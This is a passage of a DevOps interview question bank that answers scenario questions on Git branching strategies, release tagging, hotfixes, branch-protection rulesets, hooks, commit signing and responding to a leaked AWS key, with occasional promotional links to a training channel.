4. Use Conventional Commits with a tool like release-please if you want automated versioning.

**Why →** Notes come from merged PRs, so quality depends on good PR titles.

**Interview tip →** Show you know that consistent PR titles are the real investment.

</details>

## Branching Strategies and Releases

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q101. An eight-person team deploys several times a day. Which branching strategy do you recommend? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** High deploy frequency favours short feedback loops and small integrations.

**What I'd do →**
1. Trunk-based development: short-lived branches (under two days) merged to `main` through PRs.
2. Every merge to `main` must be deployable; CI gates it.
3. Hide unfinished work behind feature flags.
4. Cut release branches or tags only when a release needs stabilising.

**Why →** Long-lived branches hide integration pain until late. Trunk-based moves that pain to every day when it is small.

**Interview tip →** DORA research links trunk-based development and frequent small merges with better delivery performance.

</details>

### Q102. When would you choose GitFlow over trunk-based development? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The right model depends on how software is shipped.

**What I'd do →**
1. GitFlow fits scheduled releases and several supported versions: mobile apps, on-prem or packaged software.
2. Trunk-based fits SaaS with continuous deployment.
3. If we adopt GitFlow, keep it light: `main`, `develop`, short `release/*` and `hotfix/*` branches, and skip long feature branches.
4. Automate merge-back from release and hotfix branches to avoid divergence.

**Why →** GitFlow's overhead pays off only when you must maintain parallel release lines.

**Interview tip →** Show you know the author of GitFlow himself said it is a poor fit for continuously delivered web apps.

</details>

### Q103. In trunk-based development, a feature will take three weeks. How do you merge it daily without exposing it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Branch lifetime must stay short, but the feature is not ready for users.

**What I'd do →**
1. Slice the work into small mergeable steps (schema, backend, API, UI).
2. Wrap user-visible paths in a feature flag, default off.
3. Merge each slice behind the flag; test both flag states in CI.
4. Turn the flag on for staff, then a percentage, then everyone; remove the flag afterwards.

**Why →** Deployment and release become separate decisions, and rollback is a flag flip.

**Interview tip →** Mention flag clean-up as a real task, or flags rot into complexity.

</details>

### Q104. You are cutting a release. How do you manage the release branch and late fixes? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The release needs stabilising while `main` keeps moving.

**What I'd do →**
1. `git switch -c release/2.5 main` and protect it.
2. Only bug fixes go in; each is fixed on `main` first, then cherry-picked with `-x`.
3. Tag release candidates: `git tag -a v2.5.0-rc.1 -m "RC1"`.
4. When ready, tag `v2.5.0` on the release branch and publish.

**Why →** The branch freezes scope without freezing everyone's work.

**Interview tip →** Fix on `main` first so the next release does not regress.

</details>

### Q105. Should releases use lightweight or annotated tags? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Tags mark release points; the type decides what metadata they carry.

**What I'd do →**
1. Use annotated tags: `git tag -a v1.8.0 -m "Release 1.8.0"`.
2. Sign them if policy requires: `git tag -s v1.8.0 -m "..."`.
3. Push explicitly: `git push origin v1.8.0` (or `--follow-tags` for annotated ones).
4. Verify with `git show v1.8.0`.

**Why →** Annotated tags are full objects with tagger, date and message, and `git describe` prefers them. Lightweight tags are just refs.

**Interview tip →** `git push` does not send tags by default.

</details>

### Q106. A release tag was placed on the wrong commit and has been published. What do you do? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Moving a published tag silently breaks anyone who fetched it and any artifact built from it.

**What I'd do →**
1. If nobody consumed it: delete and recreate:

```bash
git tag -d v1.8.0
git push origin :refs/tags/v1.8.0
git tag -a v1.8.0 <right-sha> -m "Release 1.8.0"
git push origin v1.8.0
```

2. If consumed, leave it and release `v1.8.1` instead.
3. Tell users; clients must run `git fetch --tags --force`.

**Why →** Git never updates an existing tag on fetch without force, so users silently keep the wrong one.

**Interview tip →** "Tags are immutable by policy" is the answer most teams adopt; enforce it with a tag ruleset.

</details>

### Q107. Production has a bug, but `main` already contains unreleased features. How do you ship a hotfix? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Deploying `main` would ship unfinished work.

**What I'd do →**
1. Branch from the production tag: `git switch -c hotfix/1.8.1 v1.8.0`.
2. Apply the minimal fix, test, and tag `v1.8.1`; deploy that tag.
3. Port the fix to `main`: `git cherry-pick -x` or merge the hotfix branch forward.
4. Write a short post-incident note linking both PRs.

**Why →** The hotfix ships only the fix; `main` gets it later so it is not lost.

**Interview tip →** Feature flags reduce hotfix branches, since you can often disable the new feature instead.

</details>

### Q108. A team uses long-lived `dev`, `qa` and `prod` branches with merges between them. What goes wrong? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Environment branches mix "what code" with "where deployed", and they drift.

**What I'd do →**
1. Explain the failure modes: hotfixes made in `prod` never return, cherry-picks differ per branch, and "what is in prod" depends on merge order.
2. Propose one trunk, build one immutable artifact per commit, and promote the same artifact through environments.
3. Store environment differences as config (Helm values, Terraform vars, env-specific files), not branches.
4. Migrate gradually: freeze environment branches, merge all into `main`, switch pipelines to promote by SHA.

**Why →** What you test in QA should be byte-for-byte what reaches prod.

**Interview tip →** Say "promote artifacts, not branches".

</details>

### Q109. You must support versions 3.8, 3.9 and 4.0 simultaneously. How do you handle fixes? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Each fix potentially lands in four lines, so process must be cheap and traceable.

**What I'd do →**
1. Long-lived `release/x.y` branches, protected, receiving only fixes.
2. Fix on `main` first. Label the PR with versions needing backport (`backport-3.8`).
3. A bot (for example a GitHub Action) cherry-picks with `-x` and opens PRs per branch.
4. Define an end-of-life policy and publish a support matrix.

**Why →** Label-driven automation turns backporting from a chore into review work.

**Interview tip →** Support windows are a product decision; push for a clear policy.

</details>

### Q110. A monorepo has five services released independently. How do you tag and release them? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** One global `v1.2.3` tag cannot describe five independent versions.

**What I'd do →**
1. Prefix tags per service: `billing/v2.3.0`, `auth/v1.9.4`.
2. Trigger service pipelines with tag filters:

```yaml
on:
  push:
    tags: ['billing/v*']
```

3. Use path filters so CI builds only changed services.
4. Generate changelogs per path: `git log billing/v2.2.0..billing/v2.3.0 -- services/billing`.

**Why →** Prefixes keep tags unique and let tooling infer which pipeline to run.

**Interview tip →** Go modules in subdirectories use this exact tag convention.

</details>

### Q111. You want a published release and deployment to start whenever someone pushes a version tag. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The tag becomes the release trigger.

**What I'd do →**
1. Workflow trigger on tags:

```yaml
on:
  push:
    tags: ['v*.*.*']
```

2. Build the artifact, tag the image with the tag name and commit SHA.
3. Create the GitHub release: `gh release create "$GITHUB_REF_NAME" --generate-notes`.
4. Protect `v*` tags so only maintainers can create them.

**Why →** The pipeline is reproducible from a tag alone, and humans only decide when to tag.

**Interview tip →** Mention that tag creation permission is effectively release permission.

</details>

### Q112. Developers leave feature branches open for months. What policy would you set? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Old branches mean painful merges and hidden work.

**What I'd do →**
1. Set a soft limit, for example "branches live under 3 days".
2. Add a stale-branch report: `git for-each-ref --sort=committerdate refs/remotes/origin --format='%(committerdate:short) %(refname:short)'`.
3. Auto-delete merged branches and mark inactive PRs stale with a bot.
4. Talk to owners of branches that will take long and plan feature flags.

**Why →** Merge cost grows with divergence, nonlinearly.

**Interview tip →** Metrics such as "age of oldest open PR" make the problem visible.

</details>

### Q113. QA signs off on a build, and production must run exactly that code. How does Git support this? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The risk is rebuilding from a branch and getting different results.

**What I'd do →**
1. Build once per commit; name artifacts by commit SHA (for example the image tag `app:3f9a1c2`).
2. Deploy that exact tag to QA, then production; never rebuild.
3. Tag the release on the same SHA: `git tag -a v2.5.0 3f9a1c2`.
4. Record the SHA in deployment metadata so `git log` explains what runs where.

**Why →** Branch names move, SHAs do not.

**Interview tip →** Pair this with pinned dependencies and lockfiles for true reproducibility.

</details>

### Q114. A deployment broke production. Do you revert in Git or roll back the deployment first? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Speed of recovery comes first; code history clean-up second.

**What I'd do →**
1. Roll back the deployment to the previous known-good artifact (redeploy the earlier tag).
2. Stop the bleeding, then open an incident record.
3. Revert the bad commit on `main`: `git revert <sha>`, so the next deploy does not reintroduce it.
4. Fix properly with a test, and re-release.

**Why →** Rolling back an artifact takes minutes. Code fixes take longer and need review.

**Interview tip →** If main stays broken after a rollback, the next deploy brings the bug back.

</details>

### Q115. A team of four builds a web app deployed from `main`. Which simple workflow do you use? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** A small team needs minimal ceremony.

**What I'd do →**
1. GitHub Flow: branch from `main`, commit, open a PR.
2. CI runs, one teammate reviews, squash-merge.
3. Merging to `main` triggers deployment.
4. Protect `main` (PR required, checks required, no force-push).

**Why →** Few rules, always a deployable `main`.

**Interview tip →** It is trunk-based development with PRs as the gate.

</details>

### Q116. A six-month platform migration must touch hundreds of files while the product keeps shipping. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** A six-month branch would be unmergeable.

**What I'd do →**
1. Prefer incremental migration: strangler pattern, adapters, and flags merged into `main` continuously.
2. If a long-lived integration branch is unavoidable, merge `main` into it daily (automated), with `rerere` enabled.
3. Have CI run the integration branch against the full suite every night.
4. Land the final switch as a small PR.

**Why →** Divergence is the enemy. Daily sync keeps the final merge boring.

**Interview tip →** "Make the change easy, then make the easy change": branch by abstraction.

</details>

### Q117. How do you enforce a branch naming convention like `feature/ABC-123-short-name`? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Convention only works when it is checked automatically.

**What I'd do →**
1. Document the pattern in `CONTRIBUTING.md`.
2. Add a push ruleset or branch-name rule (rulesets support "branch name pattern" restrictions) to reject non-matching names.
3. Or a CI check on the PR head ref.
4. Link tickets automatically using the ID from the branch name.

**Why →** Consistent names help tooling, such as Jira linking and release notes.

**Interview tip →** Do not over-engineer; PR titles matter more than branch names.

</details>

### Q118. You want changelogs and version bumps to come from commit history. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Structured messages allow tooling to derive the release type.

**What I'd do →**
1. Adopt Conventional Commits: `feat:`, `fix:`, `feat!:` or a `BREAKING CHANGE:` footer.
2. Validate in CI with commitlint, or only validate PR titles when squash-merging.
3. Use release-please or semantic-release to compute the next version, update `CHANGELOG.md` and tag.
4. Review the generated release PR before it ships.

**Why →** `fix` maps to patch, `feat` to minor, breaking to major, so versioning is rule-based.

**Interview tip →** With squash merge, the PR title is the commit message, so validate that.

</details>

### Q119. A release is two days away and the team wants a code freeze. How do you enforce it technically? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Social agreements get violated under pressure.

**What I'd do →**
1. Branch `release/x.y` and apply stricter protection: two approvals, release-manager-only merges.
2. Leave `main` open for next-cycle work.
3. For a full freeze of `main`, temporarily tighten the ruleset (restrict who can push or merge) and lift it afterward.
4. Document the exception process for critical fixes.

**Why →** A release branch avoids freezing the whole team.

**Interview tip →** Prefer "release branch freeze" to "everyone stops".

</details>

### Q120. You forgot to tag last week's release and need to tag it now. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** A tag can be created on any past commit.

**What I'd do →**
1. Find the deployed commit: `git log --oneline --since="10 days ago"` or the SHA in your deploy record.
2. `git tag -a v2.4.0 <sha> -m "Release 2.4.0"`.
3. `git push origin v2.4.0`.
4. Back-fill the GitHub release if needed.

**Why →** Tags point at commits, not at "now".

**Interview tip →** Always confirm the SHA against what was actually deployed.

</details>

### Q121. Product asks "what exactly changed between v2.3.0 and v2.4.0?" 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** You need a commit-level and a file-level answer.

**What I'd do →**
1. `git log --oneline --no-merges v2.3.0..v2.4.0`.
2. By author or area: `git shortlog -sn v2.3.0..v2.4.0`, `git log ... -- services/api`.
3. Files: `git diff --stat v2.3.0 v2.4.0`.
4. On GitHub: compare view at `/compare/v2.3.0...v2.4.0`.

**Why →** Two dots in `git log` means "reachable from the second but not the first".

**Interview tip →** Squash merges make PR titles the best change list.

</details>

### Q122. Hotfixes on release branches keep diverging from `main`, and bugs reappear in the next release. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Fixes were applied to one line but never forwarded.

**What I'd do →**
1. Change policy: fix on `main` first, then backport.
2. Where a release-only fix is needed, require a linked forward-port PR before the release closes.
3. Detect drift: `git cherry -v main release/2.5` and `git log --cherry-pick --right-only main...release/2.5`.
4. Add a CI job that fails when the release branch has fixes missing from `main`.

**Why →** Divergence is invisible until the next release; automated checks surface it early.

**Interview tip →** Patch-id comparison is how you spot "same fix, different SHA".

</details>

### Q123. During an incident, a new feature breaks checkout. Do you revert code or turn off a flag? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Both work, but they have different speed and risk.

**What I'd do →**
1. If the feature is behind a flag, flip it off first. That takes seconds and needs no deploy.
2. If not, revert the commit (`git revert`), run a fast pipeline, and deploy the fix, or redeploy the previous artifact.
3. After recovery, write a postmortem: why wasn't it flagged, why did tests miss it.
4. Reintroduce the change with a test and a flag.

**Why →** Mean time to recovery matters more than elegant fixes during an incident.

**Interview tip →** "Roll back first, debug later" is a mark of operational maturity.

</details>

### Q124. GitOps: should app code and Kubernetes manifests live in the same repo or separate ones? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Different change rates and audiences argue for separation, though small teams may prefer one repo.

**What I'd do →**
1. Separate config repo for environment state, so deploy history is a clean Git log and access can be tighter.
2. CI in the app repo builds the image, then opens a PR (or commits) in the config repo to bump the image tag.
3. Argo CD or Flux reconciles from the config repo's `main`.
4. Rollback is `git revert` of the bump commit.

**Why →** Image bumps do not pollute app history, and deploy approval is just a PR review.

**Interview tip →** Say the trade-off honestly: two repos mean extra plumbing.

</details>

### Q125. Your 40-person organisation uses GitFlow and wants to move to trunk-based development. How do you migrate? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** This is a cultural and tooling change, not a Git command.

**What I'd do →**
1. Prerequisites first: fast reliable CI, feature flags, and good test coverage.
2. Agree the target: PRs under a day, `main` always deployable.
3. Collapse `develop` into `main`: merge it, then stop using it.
4. Pilot with one team, measure lead time and change failure rate, then expand.
5. Keep release branches only for products with real multi-version support.

**Why →** Moving the branching model without CI and flags just moves the pain.

**Interview tip →** Frame it with DORA metrics so the benefit is measurable.

</details>

## Protection, Hooks and Policy

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q126. You are asked to protect `main`. Which rules do you turn on? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The aim is that nothing reaches `main` without review and passing checks.

**What I'd do →**
1. Require a pull request with at least one approval, and dismiss stale approvals on new pushes.
2. Require status checks (build, test, lint) and require branches to be up to date.
3. Block force pushes and deletion.
4. Require linear history or restrict merge types, as the team prefers.
5. Apply rules to administrators too.

**Why →** Rules that admins can skip protect against nothing during a rushed Friday deploy.

**Interview tip →** Mention CODEOWNERS for sensitive paths.

</details>

### Q127. Classic branch protection or repository rulesets: which do you use? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Both enforce rules, but rulesets are the newer, more flexible system.

**What I'd do →**
1. Prefer rulesets: they target branches and tags by pattern, can be layered, and support org-wide rules.
2. Use "evaluate" mode to test a ruleset before enforcing it.
3. Use bypass lists for specific roles, apps or teams, with an audit trail.
4. Migrate gradually; where both apply, the most restrictive result wins.

**Why →** Rulesets avoid copy-pasting protection per repo and give visibility into who can bypass.

**Interview tip →** Say "rulesets are layered and additive".

</details>

### Q128. A required status check never reports and the PR is stuck as "Expected — Waiting for status". 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The workflow did not run, was skipped by path filters, or the check name changed.

**What I'd do →**
1. Check the workflow `on:` triggers and `paths:` filters. A skipped workflow leaves the check pending forever.
2. Confirm the required check name matches the job name exactly (matrix jobs add suffixes).
3. Add a final always-run "gate" job that depends on the others and require only that.

```yaml
gate:
  if: always()
  needs: [build, test]
  runs-on: ubuntu-latest
  steps:
    - run: test "${{ contains(needs.*.result, 'failure') }}" = "false"
```

**Why →** One stable required check decouples protection from job renames and path filtering.

**Interview tip →** Know that a job skipped because of its own `if:` reports as success, but a workflow that never triggered reports nothing.

</details>

### Q129. Production is down and the fix needs to merge now, but approvals are required. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** You need an emergency path that is fast but auditable.

**What I'd do →**
1. Pre-define a break-glass process: a small group on the ruleset bypass list ("pull requests only" bypass preferred over full bypass).
2. Open the PR anyway, get a verbal or chat approval from the incident commander, then merge with bypass.
3. Record the reason in the PR and the incident ticket.
4. Review every bypass afterward in the audit log.

**Why →** Bypass should be rare, visible and reviewed.

**Interview tip →** Say you would rather make the normal path faster than live on bypasses.

</details>

### Q130. You want to stop developers from committing obvious mistakes like debug prints, trailing whitespace or secrets. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Catch issues before they hit the remote.

**What I'd do →**
1. Add the `pre-commit` framework with a `.pre-commit-config.yaml` (linters, formatters, `detect-secrets` or `gitleaks`).
2. Install the hooks: `pre-commit install`.
3. Run the same checks in CI as a backstop.

**Why →** Local hooks give fast feedback, and CI catches anything that skipped them.

**Interview tip →** Hooks are advisory; developers can bypass with `--no-verify`.

</details>

### Q131. Hooks in `.git/hooks` are not shared with the team. How do you distribute them? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** `.git` is never part of the repository.

**What I'd do →**
1. Commit hooks to a tracked folder such as `.githooks/`.
2. Point Git at it: `git config core.hooksPath .githooks`.
3. Automate that in a bootstrap script or `make setup`.
4. Or use pre-commit, Husky or lefthook, which install themselves.

**Why →** `core.hooksPath` is local config, so each clone must run it once.

**Interview tip →** Because hooks are local, always duplicate critical checks in CI.

</details>

### Q132. A developer bypasses your hook with `git commit --no-verify`. How do you enforce the rule anyway? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Client-side hooks can never be trusted for enforcement.

**What I'd do →**
1. Move the rule to CI and make that check required.
2. Use server-side controls: rulesets (file path or size restrictions, commit message patterns) on GitHub.
3. Keep hooks as fast feedback only.
4. For self-hosted Git, a `pre-receive` hook rejects bad pushes server-side.

**Why →** The server is the only place you control.

**Interview tip →** This distinction (client versus server enforcement) is a favourite interview question.

</details>

### Q133. Every commit message must reference a ticket such as `ABC-123`. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Traceability is required for audits.

**What I'd do →**
1. Local `commit-msg` hook:

```bash
#!/usr/bin/env bash
grep -qE '^(ABC|PLAT)-[0-9]+' "$1" || {
  echo "Commit message must start with a ticket ID, e.g. ABC-123" >&2
  exit 1
}
```

2. With squash merges, validate the PR title in CI instead, since that becomes the commit message.
3. Optionally add `prepare-commit-msg` to prefill the ticket from the branch name.

**Why →** The check on PR title is enforceable, whereas the local hook is a convenience.

**Interview tip →** Say which of the two is authoritative.

</details>

### Q134. You want tests to run before every push. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Catching failures before CI saves round trips.

**What I'd do →**
1. Create `.githooks/pre-push`, make it executable (`chmod +x`).
2. Run a fast subset: lint plus unit tests, not the full suite.
3. Exit non-zero to block the push.
4. Allow skipping when needed with `git push --no-verify`, knowing CI still checks.

**Why →** If the hook takes minutes, people bypass it. Keep it under ten or so seconds.

**Interview tip →** Fast hooks get used; slow hooks get disabled.

</details>

### Q135. Security wants to stop anyone pushing `.pem`, `.exe` or files over 50 MB, with no client trust. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** The restriction must be applied at push time, server-side.

**What I'd do →**
1. Use push rulesets (available for repositories in organisations on paid plans) to restrict file extensions, file paths and maximum file size.
2. Apply them org-wide so new repos inherit the policy.
3. Pair with secret scanning push protection for credentials inside files.
4. Self-hosted alternative: a `pre-receive` hook that inspects `git rev-list` of new objects.

**Why →** GitHub rejects the push before the objects land, so nothing sensitive reaches the remote.

**Interview tip →** Know that GitHub's hard limits are 100 MB per file and a warning at 50 MB.

</details>

### Q136. Auditors want every commit on `main` to be verified as signed. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Enforcement and developer setup both matter.

**What I'd do →**
1. Enable "Require signed commits" in the ruleset for `main`.
2. Give developers a signing setup, for example SSH signing:

```bash
git config --global gpg.format ssh
git config --global user.signingkey ~/.ssh/id_ed25519.pub
git config --global commit.gpgsign true
```

3. Upload the same key to GitHub as a "Signing key".
4. With squash or web merges, GitHub signs the resulting commit itself.

**Why →** Branch rules reject unsigned pushes, so signing is not optional.

**Interview tip →** Mention that rebase-merge breaks signatures because the commits are re-created.

</details>

### Q137. The team wants a strictly linear history on `main`. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** No merge commits at all.

**What I'd do →**
1. Enable "Require linear history" in the ruleset.
2. In repo settings, allow only squash merge and/or rebase merge; disable merge commits.
3. Developers rebase their branches before merging.

**Why →** Linear history is easier to bisect, revert and read.

**Interview tip →** Rebase-merge keeps each commit; squash-merge keeps one. Be ready to justify your pick.

</details>

### Q138. An approved PR gets a new commit just before merge. How do you prevent unreviewed code from slipping in? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** An approval should apply to the code that was reviewed.

**What I'd do →**
1. Enable "Dismiss stale pull request approvals when new commits are pushed".
2. Enable "Require approval of the most recent reviewable push" so the pusher cannot self-approve.
3. Require review from Code Owners for sensitive paths.

**Why →** Otherwise a malicious or careless push after approval merges unchecked.

**Interview tip →** This is a common supply-chain control question.

</details>

### Q139. You are the only maintainer, but the rule requires one approval. How do you work? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** A strict rule locks out a team of one.

**What I'd do →**
1. Keep required checks and linear history; they still protect you.
2. Set required approvals to 0 for a personal repo, or add a second trusted reviewer.
3. If you need review for compliance, add an admin bypass restricted to PRs only.
4. Use a bot or self-review checklist in the PR template.

**Why →** Control should match risk. A rule nobody can meet becomes a bypass habit.

**Interview tip →** GitHub does not let authors approve their own PRs.

</details>

### Q140. You must stop people from deleting or moving release tags. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Tags are release identity and must be immutable.

**What I'd do →**
1. Create a ruleset targeting tags with pattern `v*`.
2. Enable "Restrict deletions" and "Restrict updates" ("Block force pushes").
3. Allow creation only for release managers or the release bot.
4. Verify by trying `git push --delete origin v1.0.0` from a test account.

**Why →** Anyone who can move a tag can change what "v1.0.0" means in production.

**Interview tip →** Legacy tag protection rules were replaced by rulesets.

</details>

### Q141. Large binaries keep landing in the repo and clones are getting slow. What controls would you add? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Prevention is cheaper than history rewriting.

**What I'd do →**
1. Push ruleset with a maximum file size (for example 10 MB) and blocked extensions.
2. Route legitimate large assets to Git LFS via `.gitattributes`.
3. A CI check on the diff: `git diff --stat` or a script flagging files above the threshold.
4. Monitor repository size regularly: `git count-objects -vH`, and `git sizer` for deeper analysis.

**Why →** Once a blob is in history, only a rewrite removes it and everyone must re-clone.

**Interview tip →** Mention `git-sizer` as the tool for finding why a repo is slow.

</details>

### Q142. Release branches (`release/*`) need stricter rules than feature branches. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** One ruleset per branch is tedious; patterns solve it.

**What I'd do →**
1. Ruleset targeting `refs/heads/release/*`.
2. Require 2 approvals, code owner review, and the full test workflow.
3. Restrict who can push or merge to the release managers team.
4. Block deletion and force pushes.

**Why →** Patterns apply automatically to every new release branch, so nobody forgets to protect it.

**Interview tip →** Test with "evaluate" mode before enforcing.

</details>

### Q143. A regulator asks who changed branch protection settings and when. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** You need an audit trail outside Git.

**What I'd do →**
1. Query the organisation audit log (UI, or `gh api /orgs/ORG/audit-log` on Enterprise Cloud) filtering for ruleset and protection events.
2. Stream audit logs to your SIEM for long-term retention.
3. Store protection config as code (Terraform `github_repository_ruleset`) so changes are PR-reviewed.
4. Alert on bypass events and ruleset edits.

**Why →** Config as code gives history, review and rollback for the controls themselves.

**Interview tip →** Say "protect the protections" — admins who can change rules can undo any control.

</details>

### Q144. How do you enforce Conventional Commit format without a local hook? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Enforcement must work for everyone and survive squash merging.

**What I'd do →**
1. Add a PR title check in CI, for example `amannn/action-semantic-pull-request`.
2. Make it a required check.
3. Configure the repo to use "Pull request title" for squash commit messages.
4. Optionally run commitlint for repos that use merge or rebase.

**Why →** The squash commit message is what lands in history, and it comes from the PR title.

**Interview tip →** Validate where the message is born, not where it is typed.

</details>

### Q145. A security incident requires you to temporarily stop all merges to `main`. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** You need a fast, reversible freeze.

**What I'd do →**
1. Prepare a "freeze" ruleset in advance with an empty bypass list, set to Disabled.
2. During the incident, switch it to Active; it blocks all merges and pushes.
3. Alternatively, restrict the merge queue or temporarily mark a required check as failing via a variable.
4. Reverse it afterward and note it in the incident timeline.

**Why →** A rehearsed switch beats improvising under pressure.

**Interview tip →** Archiving the repo is too blunt and also blocks issues.

</details>

### Q146. Production deploys should require a manual approval and only from reviewed code. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Branch protection controls code; environment protection controls deployment.

**What I'd do →**
1. Create a GitHub Environment `production` with required reviewers and a deployment-branch rule limited to `main` (and `v*` tags).
2. Reference it in the workflow: `environment: production`; the job pauses until approved.
3. Scope the deploy secrets to that environment only.
4. Enable "Prevent self-review" so the person who triggered it cannot approve.

**Why →** Secrets stored in an environment are released only after rules pass, so a rogue branch cannot reach them.

**Interview tip →** Combine OIDC federation with environments so there are no long-lived cloud keys.

</details>

### Q147. Dependabot opens 30 PRs a week. How do you merge them safely and quickly? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Manual review of every patch bump does not scale.

**What I'd do →**
1. Group updates in `dependabot.yml` (`groups:`) and set a weekly schedule.
2. Enable auto-merge for patch and minor updates when all required checks pass:

```bash
gh pr merge --auto --squash "$PR_URL"
```

3. Keep major updates for human review.
4. Make sure tests are good, because auto-merge is only as safe as CI.

**Why →** Auto-merge removes toil, while branch protection keeps the safety net.

**Interview tip →** Restrict workflow permissions for the Dependabot actor.

</details>

### Q148. Compliance (SOC 2) requires two approvals, no self-merge and traceable changes. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** You need technical controls that map to the written policy.

**What I'd do →**
1. Ruleset: 2 required approvals, dismiss stale approvals, require last-push approval, code owners for critical paths.
2. Required checks and signed commits; no bypass except a break-glass team.
3. Manage rules as code and export evidence (ruleset JSON, audit-log events, PR history).
4. Review bypass events monthly.

**Why →** Auditors want evidence that the control is enforced, not just documented.

**Interview tip →** Say that the PR is the unit of change evidence: approvals, checks and the merge are all recorded.

</details>

### Q149. You want a consistent set of formatters and linters on every developer machine. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** A shared hook configuration beats wiki instructions.

**What I'd do →**
1. Commit `.pre-commit-config.yaml` with pinned versions:

```yaml
repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v5.0.0
    hooks:
      - id: end-of-file-fixer
      - id: check-added-large-files
```

2. `pre-commit install` once per clone; `pre-commit run --all-files` to check everything.
3. Run `pre-commit` in CI as well, and update versions with `pre-commit autoupdate`.

**Why →** Pinned revs give identical results everywhere.

**Interview tip →** Same config locally and in CI means no "passes locally, fails in CI".

</details>

### Q150. A release bot must push version bump commits to protected `main`, but humans must not. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** The bot needs a narrow exception, not a weakening of the rule for everyone.

**What I'd do →**
1. Use a GitHub App (not a personal token) for the bot, with minimal permissions.
2. Add only that app to the ruleset bypass list.
3. Prefer having the bot open a PR with auto-merge, which needs no bypass at all.
4. Store the app credentials as environment secrets and rotate keys.

**Why →** Apps have scoped permissions and appear clearly in the audit log, unlike a shared human PAT.

**Interview tip →** The PR-based approach avoids bypass entirely and is the safer pattern.

</details>

## Secrets, Signing and Security

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q151. A developer pushed an AWS access key to a public repo 10 minutes ago. What is your first move? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Bots scan public pushes within seconds. Assume the key is already compromised.

**What I'd do →**
1. Revoke or deactivate the key in IAM immediately; create a replacement and deploy it.
2. Review CloudTrail for use of the key since the push; check for new users, instances and unusual regions.
3. Only then clean the repo (remove from history, see the next question).
4. Write up the incident and add push protection and a pre-commit scanner.

**Why →** Deleting the commit does not undo exposure. Rotation does.

**Interview tip →** "Rotate first, clean second" is the sentence interviewers listen for.

</details>

### Q152. After rotating the leaked key, you must purge it from repository history. How? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** The key is dead, but history still shows it, and scanners and forks keep flagging it.

**What I'd do →**
1. Fresh mirror clone: `git clone --mirror git@github.com:org/app.git`.
2. Replace the string everywhere:

```bash
echo 'AKIAXXXXXXXXXXXXXXXX==>REMOVED' > replacements.txt
git filter-repo --replace-text replacements.txt
git push --force --mirror
```

3. Ask all developers to re-clone (not pull), and close or recreate open PRs.
4. Contact GitHub Support to purge cached views and `refs/pull/*` references if needed; check forks.

**Why →** Rewriting changes all downstream SHAs, so coordination matters. Old clones can re-introduce the secret on push.

**Interview tip →** BFG is an alternative, but `git filter-repo` is the tool Git itself recommends.

</details>

